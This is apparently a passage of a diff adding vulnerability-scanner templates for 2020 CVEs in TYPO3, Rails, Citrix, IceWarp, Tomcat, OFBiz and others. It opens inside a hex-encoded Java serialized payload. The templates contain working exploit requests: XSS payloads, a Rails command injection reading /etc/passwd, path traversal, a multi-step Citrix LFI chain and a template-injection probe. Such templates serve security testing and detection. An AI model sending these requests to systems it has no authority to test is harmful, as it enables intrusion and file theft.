6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878%3B%22%7D\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-8091",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "TYPO3 Cross-Site Scripting Vulnerability",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "31337"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/x-shockwave-flash"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/typo3/contrib/websvg/svg.swf?uniqueId=%22])}catch(e){if(!this.x)alert(31337),this.x=1}//"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-8115",
+      "info": {
+        "author": "madrobot & dwisiswant0",
+        "name": "Revive Adserver XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "(?mi)window\\.location\\.replace\\(\".*alert\\(1337\\)"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/www/delivery/afr.php?refresh=10000&\")',10000000);alert(1337);setTimeout('alert(\""
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-8163",
+      "info": {
+        "author": "tim_koopmans",
+        "description": "Tests for ability to pass user parameters as local variables into partials",
+        "name": "Potential Remote Code Execution on Rails",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-8191",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "Citrix ADC & NetScaler Gateway Reflected XSS",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</title><script>alert(31337)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /menu/stapp HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 96\nContent-Type: application/x-www-form-urlencoded\nX-NITRO-USER: xpyZxwy6\n\nsid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&username=nsroot\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-8193",
+      "info": {
+        "author": "pdteam",
+        "name": "Citrix unauthenticated LFI",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "cookie-reuse": true,
+          "extractors": [
+            {
+              "internal": true,
+              "name": "randkey",
+              "part": "body",
+              "regex": [
+                "(?m)[0-9]{3,10}\\.[0-9]+"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "raw": [
+            "POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/xml\nX-NITRO-USER: xpyZxwy6\nX-NITRO-PASS: xWXHUJ56\n\n<appfwprofile><login></login></appfwprofile>\n",
+            "GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\n",
+            "GET /menu/neo HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\n",
+            "GET /menu/stc HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\n",
+            "POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\nContent-Type: application/xml\nX-NITRO-USER: oY39DXzQ\nX-NITRO-PASS: ZuU9Y9c1\nrand_key: randkey\n\n<appfwprofile><login></login></appfwprofile>\n",
+            "POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.24.0\nAccept: */*\nConnection: close\nContent-Type: application/xml\nX-NITRO-USER: oY39DXzQ\nX-NITRO-PASS: ZuU9Y9c1\nrand_key: randkey\n\n<clipermission></clipermission>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-8194",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "Citrix ADC & NetScaler Gateway Reflected Code Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<jnlp codebase=\"nonexistent.1337\">"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/x-java-jnlp-file"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /menu/guiw?nsbrand=1&protocol=nonexistent.1337\">&id=3&nsvpx=phpinfo HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nCookie: startupapp=st\nUpgrade-Insecure-Requests: 1\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-8209",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Improper access control in Citrix XenMobile Server 10.12 before RP2,\nCitrix XenMobile Server 10.11 before RP4, Citrix XenMobile Server 10.10\nbefore RP6 and Citrix XenMobile Server before 10.9 RP5 and leads to the ability to read arbitrary files.\n\nReferences:\n- https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/\n",
+        "name": "Citrix XenMobile Server Path Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            },
+            {
+              "condition": "and",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "fileDownload=true",
+                "application/octet-stream",
+                "attachment;"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-8512",
+      "info": {
+        "author": "pdnuclei & dwisiswant0",
+        "description": "In IceWarp Webmail Server through 11.4.4.1, there is XSS in the /webmail/ color parameter.",
+        "name": "IceWarp WebMail XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<svg/onload=alert(document.domain)>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22",
+            "{{BaseURL}}:32000/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-8982",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "An unauthenticated arbitrary file read issue exists in all versions of Citrix ShareFile StorageZones (aka storage zones) Controller, including the most recent 5.10.x releases as of May 2020.",
+        "name": "Citrix ShareFile StorageZones Unauthenticated Arbitrary File Read",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "bit app support",
+                "fonts",
+                "extensions"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-9047",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "This template supports the detection part only. See references.\n\nA vulnerability exists that could allow the execution of\nunauthorized code or operating system commands on systems\nrunning exacqVision Web Service versions 20.06.3.0 and prior\nand exacqVision Enterprise Manager versions 20.06.4.0 and prior.\n\nAn attacker with administrative privileges could potentially\ndownload and run a malicious executable that\ncould allow OS command injection on the system.\n\nSource/References:\n- https://github.com/norrismw/CVE-2020-9047\n",
+        "name": "exacqVision Web Service RCE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "or",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "3.10.4.72058",
+                "3.12.4.76544",
+                "3.8.2.67295",
+                "7.0.2.81005",
+                "7.2.7.86974",
+                "7.4.3.89785",
+                "7.6.4.94391",
+                "7.8.2.97826",
+                "8.0.6.105408",
+                "8.2.2.107285",
+                "8.4.3.111614",
+                "8.6.3.116175",
+                "8.8.1.118913",
+                "9.0.3.124620",
+                "9.2.0.127940",
+                "9.4.3.137684",
+                "9.6.7.145949",
+                "9.8.4.149166",
+                "19.03.3.152166",
+                "19.06.4.157118",
+                "19.09.4.0",
+                "19.12.2.0",
+                "20.03.2.0",
+                "20.06.3.0"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/version.web"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-9344",
+      "info": {
+        "author": "madrobot",
+        "description": "Subversion ALM for the enterprise before 8.8.2 allows reflected XSS at multiple locations.",
+        "name": "Jira Subversion ALM for enterprise XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugins/servlet/svnwebclient/changedResource.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
+            "{{BaseURL}}/plugins/servlet/svnwebclient/commitGraph.jsp?%27)%3Balert(%22XSS",
+            "{{BaseURL}}/plugins/servlet/svnwebclient/commitGraph.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
+            "{{BaseURL}}/plugins/servlet/svnwebclient/error.jsp?errormessage=%27%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&description=test",
+            "{{BaseURL}}/plugins/servlet/svnwebclient/statsItem.jsp?url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-9484",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server",
+        "name": "Apache Tomcat RCE by deserialization",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Cookie": "JSESSIONID=../../../../../usr/local/tomcat/groovy"
+          },
+          "matchers": [
+            {
+              "status": [
+                500
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Exception",
+                "ObjectInputStream",
+                "PersistentManagerBase"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.jsp",
+            "{{BaseURL}}:8080/index.jsp"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-9496",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "XML-RPC request are vulnerable to unsafe deserialization and Cross-Site Scripting issues in Apache OFBiz 17.12.03",
+        "name": "Apache OFBiz XML-RPC Java Deserialization",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "faultString",
+                "No such service [ProjectDiscovery]",
+                "methodResponse"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Type: text/xml"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /webtools/control/xmlrpc HTTP/1.1\nHost: {{Hostname}}\nOrigin: http://{{Hostname}}\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>dwisiswant0</value></param></params></methodCall>\n",
+            "POST /webtools/control/xmlrpc HTTP/1.1\nHost: {{Hostname}}:8080\nOrigin: http://{{Hostname}}:8080\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>dwisiswant0</value></param></params></methodCall>\n",
+            "POST /webtools/control/xmlrpc HTTP/1.1\nHost: {{Hostname}}:8443\nOrigin: https://{{Hostname}}:8443\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>dwisiswant0</value></param></params></methodCall>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-9757",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "The SEOmatic component before 3.3.0 for Craft CMS allows Server-Side Template Injection that leads to RCE via malformed data to the metacontainers controller.",
+        "name": "SEOmatic < 3.3.0 Server-Side Template Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "MetaLinkContainer",
+                "canonical",
+                "22344"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/actions/seomatic/meta-container/meta-link-container/?uri={{228*'98'}}",
+            "{{BaseURL}}/actions/seomatic/meta-container/all-meta-containers?uri={{228*'98'}}"
+          ]
+        }
+      ]
+    }
+  ]
+}
